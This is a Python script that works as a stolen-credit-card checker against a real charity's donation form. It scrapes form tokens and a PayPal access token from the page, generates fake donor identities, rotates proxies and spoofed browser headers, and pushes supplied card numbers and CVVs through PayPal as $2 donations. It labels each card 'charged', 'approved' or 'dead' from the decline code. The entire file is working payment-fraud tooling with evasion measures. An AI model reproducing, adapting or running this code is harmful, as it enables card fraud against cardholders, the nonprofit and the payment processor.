import aiohttp
import asyncio
import time
import re
import base64
import random
import json
import uuid
from typing import List, Optional
from proxy_manager import proxy_manager

SITE_URL = "https://princessforaday.org"
DONATE_PAGE = "https://princessforaday.org/donations/custom-donation/"
AMOUNT = "2.00"

_CHROME_VERS = [
    '134.0.6943.70', '135.0.7049.42', '136.0.7103.49', '137.0.7151.55',
    '138.0.7204.93', '139.0.7259.50', '140.0.7310.40',
]
_OS_LIST = [
    ('Linux; Android 10; K', '"Android"'),
    ('Linux; Android 11; SM-G991B', '"Android"'),
    ('Linux; Android 12; Pixel 6', '"Android"'),
    ('Linux; Android 13; SM-S918B', '"Android"'),
    ('Linux; Android 14; Pixel 8', '"Android"'),
    ('Linux; Android 13; SM-A546B', '"Android"'),
    ('Linux; Android 12; M2101K6G', '"Android"'),
]
_FIRST = [
    'James','Robert','John','Michael','David','William','Richard','Joseph','Thomas',
    'Christopher','Charles','Daniel','Matthew','Anthony','Mark','Steven','Andrew',
    'Paul','Joshua','Kenneth','Kevin','Brian','George','Timothy','Ronald','Jason',
    'Edward','Jeffrey','Ryan','Jacob','Gary','Nicholas','Eric','Jonathan','Stephen',
    'Larry','Justin','Scott','Brandon','Benjamin','Samuel','Raymond','Gregory',
    'Frank','Alexander','Patrick','Jack','Dennis','Jerry','Tyler','Aaron','Jose',
]
_LAST = [
    'Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez',
    'Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor',
    'Moore','Jackson','Martin','Lee','Perez','Thompson','White','Harris','Sanchez',
    'Clark','Ramirez','Lewis','Robinson','Walker','Young','Allen','King','Wright',
    'Scott','Torres','Nguyen','Hill','Flores','Green','Adams','Nelson','Baker',
]
_DOMAINS = [
    'gmail.com','yahoo.com','outlook.com','hotmail.com','protonmail.com',
    'icloud.com','aol.com','mail.com',
]
_ACCEPT_LANGS = [
    'en-US,en;q=0.9', 'en-US,en;q=0.9,es;q=0.8',
    'en-GB,en;q=0.9,en-US;q=0.8', 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
    'en-US,en;q=0.8', 'en-US,en;q=0.9,fr;q=0.7',
]


def _gen_browser():
    cv = random.choice(_CHROME_VERS)
    major = cv.split('.')[0]
    os_str, plat = random.choice(_OS_LIST)
    ua = f'Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Mobile Safari/537.36'
    sec_ua = f'"Chromium";v="{major}", "Not/A)Brand";v="24"'
    return ua, sec_ua, plat


def _gen_identity():
    fn = random.choice(_FIRST)
    ln = random.choice(_LAST)
    sep = random.choice(['.', '_', '-', ''])
    num = random.randint(10, 9999)
    email = f'{fn.lower()}{sep}{ln.lower()}{num}@{random.choice(_DOMAINS)}'
    return fn, ln, email


async def _safe_json(resp):
    text = await resp.text()
    if not text or not text.strip():
        return None, text
    try:
        return json.loads(text), text
    except Exception:
        return None, text


async def _retry_post(session, url, retries=2, delay=2.0, **kwargs):
    last_err = None
    for attempt in range(retries + 1):
        try:
            async with session.post(url, **kwargs) as resp:
                data, raw = await _safe_json(resp)
                if data is not None:
                    return data, raw, resp.status
                if attempt < retries:
                    await asyncio.sleep(delay + random.uniform(0.5, 1.5))
                    continue
                return None, raw, resp.status
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            last_err = e
            if attempt < retries:
                await asyncio.sleep(delay + random.uniform(0.5, 1.5))
                continue
    raise last_err or Exception("Retry exhausted")


async def check_card(cc: str, mm: str, yy: str, cvv: str, user_proxies: Optional[List[str]] = None) -> dict:
    start_time = time.time()

    if len(yy) == 4:
        yy = yy[2:]

    proxy_url = proxy_manager.get_aiohttp_proxy(user_proxies)
    ua, sec_ua, plat = _gen_browser()
    fn, ln, email = _gen_identity()
    lang = random.choice(_ACCEPT_LANGS)
    metadata_id = uuid.uuid4().hex

    connector = None
    try:
        jar = aiohttp.CookieJar()
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(cookie_jar=jar, connector=connector, timeout=timeout) as session:

            base_headers = {
                'origin': SITE_URL,
                'referer': DONATE_PAGE,
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': plat,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'accept-language': lang,
                'x-requested-with': 'XMLHttpRequest',
            }

            async with session.get(DONATE_PAGE, headers=base_headers, proxy=proxy_url) as resp:
                page_html = await resp.text()

            id_form1_m = re.search(r'name="give-form-id-prefix" value="(.*?)"', page_html)
            id_form2_m = re.search(r'name="give-form-id" value="(.*?)"', page_html)
            nonec_m    = re.search(r'name="give-form-hash" value="(.*?)"', page_html)
            enc_m      = re.search(r'"data-client-token":"(.*?)"', page_html)

            if not all([id_form1_m, id_form2_m, nonec_m, enc_m]):
                return {'status': 'error', 'message': 'Failed to parse donation page', 'time': time.time() - start_time}

            id_form1 = id_form1_m.group(1)
            id_form2 = id_form2_m.group(1)
            nonec    = nonec_m.group(1)

            dec = base64.b64decode(enc_m.group(1)).decode('utf-8')
            au_m = re.search(r'"accessToken":"(.*?)"', dec)
            if not au_m:
                return {'status': 'error', 'message': 'Failed to get PayPal access token', 'time': time.time() - start_time}
            au = au_m.group(1)

            init_data = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': DONATE_PAGE,
                'give-form-url': DONATE_PAGE,
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': fn,
                'give_last': ln,
                'give_email': email,
                'card_name': fn,
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }

            async with session.post(
                f'{SITE_URL}/wp-admin/admin-ajax.php',
                headers=base_headers,
                data=init_data,
                proxy=proxy_url
            ) as resp:
                await resp.text()

            base_form = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': DONATE_PAGE,
                'give-form-url': DONATE_PAGE,
                'give-form-minimum': AMOUNT,
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': AMOUNT,
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': fn,
                'give_last': ln,
                'give_email': email,
                'card_name': fn,
                'card_exp_month': '',
                'card_exp_year': '',
                'give-gateway': 'paypal-commerce',
            }

            mp_headers = {
                'origin': SITE_URL,
                'referer': DONATE_PAGE,
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': plat,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'accept-language': lang,
            }

            def build_form_data():
                fd = aiohttp.FormData()
                for k, v in base_form.items():
                    fd.add_field(k, v)
                return fd

            order_data, order_raw, order_status = await _retry_post(
                session,
                f'{SITE_URL}/wp-admin/admin-ajax.php',
                retries=2, delay=2.0,
                params={'action': 'give_paypal_commerce_create_order'},
                headers=mp_headers,
                data=build_form_data(),
                proxy=proxy_url
            )

            if not order_data:
                return {'status': 'error', 'message': f'Empty order response (HTTP {order_status})', 'time': time.time() - start_time}

            tok = order_data.get('data', {}).get('id')
            if not tok:
                return {'status': 'error', 'message': 'Failed to create PayPal order', 'time': time.time() - start_time}

            paypal_headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': lang,
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': metadata_id,
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': plat,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': ua,
            }

            json_data = {
                'payment_source': {
                    'card': {
                        'number': cc,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvv,
                        'attributes': {
                            'verification': {'method': 'SCA_WHEN_REQUIRED'},
                        },
                    },
                },
                'application_context': {'vault': False},
            }

            async with session.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=paypal_headers,
                json=json_data,
            ) as resp:
                confirm_text = await resp.text()
                confirm_status = resp.status

            if confirm_status == 422 or confirm_status >= 500:
                pass
            elif not confirm_text.strip():
                return {'status': 'error', 'message': 'Empty PayPal confirm response', 'time': time.time() - start_time}

            approve_data, approve_raw, approve_status = await _retry_post(
                session,
                f'{SITE_URL}/wp-admin/admin-ajax.php',
                retries=2, delay=2.0,
                params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
                headers=mp_headers,
                data=build_form_data(),
                proxy=proxy_url
            )

            text = approve_raw if approve_raw else ''

        elapsed = time.time() - start_time

        if 'true' in text or 'sucsess' in text:
            return {'status': 'charged', 'message': f'Charged ${AMOUNT}', 'time': elapsed}
        elif 'INSUFFICIENT_FUNDS' in text:
            return {'status': 'approved', 'message': 'Insufficient Funds', 'time': elapsed}
        elif 'DO_NOT_HONOR' in text:
            return {'status': 'dead', 'message': 'Do Not Honor', 'time': elapsed}
        elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return {'status': 'dead', 'message': 'Account Closed', 'time': elapsed}
        elif 'LOST_OR_STOLEN' in text:
            return {'status': 'dead', 'message': 'Lost Or Stolen', 'time': elapsed}
        elif 'CVV2_FAILURE' in text:
            return {'status': 'dead', 'message': 'Card Issuer Declined CVV', 'time': elapsed}
        elif 'SUSPECTED_FRAUD' in text:
            return {'status': 'dead', 'message': 'Suspected Fraud', 'time': elapsed}
        elif 'INVALID_ACCOUNT' in text:
            return {'status': 'dead', 'message': 'Invalid Account', 'time': elapsed}
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return {'status': 'dead', 'message': 'Reattempt Not Permitted', 'time': elapsed}
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text or 'ACCOUNT BLOCKED BY ISSUER' in text:
            return {'status': 'dead', 'message': 'Account Blocked By Issuer', 'time': elapsed}
        elif 'ORDER_NOT_APPROVED' in text:
            return {'status': 'dead', 'message': 'Order Not Approved', 'time': elapsed}
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return {'status': 'dead', 'message': 'Pickup Card Special Conditions', 'time': elapsed}
        elif 'PAYER_CANNOT_PAY' in text:
            return {'status': 'dead', 'message': 'Payer Cannot Pay', 'time': elapsed}
        elif 'GENERIC_DECLINE' in text:
            return {'status': 'dead', 'message': 'Generic Decline', 'time': elapsed}
        elif 'COMPLIANCE_VIOLATION' in text:
            return {'status': 'dead', 'message': 'Compliance Violation', 'time': elapsed}
        elif 'TRANSACTION_NOT_PERMITTED' in text or 'TRANSACTION NOT PERMITTED' in text:
            return {'status': 'dead', 'message': 'Transaction Not Permitted', 'time': elapsed}
        elif 'PAYMENT_DENIED' in text:
            return {'status': 'dead', 'message': 'Payment Denied', 'time': elapsed}
        elif 'INVALID_TRANSACTION' in text:
            return {'status': 'dead', 'message': 'Invalid Transaction', 'time': elapsed}
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return {'status': 'dead', 'message': 'Restricted Or Inactive Account', 'time': elapsed}
        elif 'SECURITY_VIOLATION' in text:
            return {'status': 'dead', 'message': 'Security Violation', 'time': elapsed}
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return {'status': 'dead', 'message': 'Declined Due To Updated Account', 'time': elapsed}
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return {'status': 'dead', 'message': 'Invalid Or Restricted Card', 'time': elapsed}
        elif 'EXPIRED_CARD' in text:
            return {'status': 'dead', 'message': 'Expired Card', 'time': elapsed}
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return {'status': 'dead', 'message': 'Cryptographic Failure', 'time': elapsed}
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return {'status': 'dead', 'message': 'Transaction Cannot Be Completed', 'time': elapsed}
        elif 'DECLINED_PLEASE_RETRY' in text:
            return {'status': 'dead', 'message': 'Declined Please Retry Later', 'time': elapsed}
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return {'status': 'dead', 'message': 'Exceed Limit', 'time': elapsed}
        else:
            try:
                err = json.loads(text).get('data', {}).get('error', 'Unknown Error')
                return {'status': 'dead', 'message': str(err)[:80], 'time': elapsed}
            except Exception:
                if not text.strip():
                    return {'status': 'error', 'message': 'Empty response from site', 'time': elapsed}
                return {'status': 'error', 'message': 'Unknown Response', 'time': elapsed}

    except asyncio.TimeoutError:
        return {'status': 'error', 'message': 'Request timed out', 'time': time.time() - start_time}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': time.time() - start_time}
    finally:
        if connector and not connector.closed:
            await connector.close()
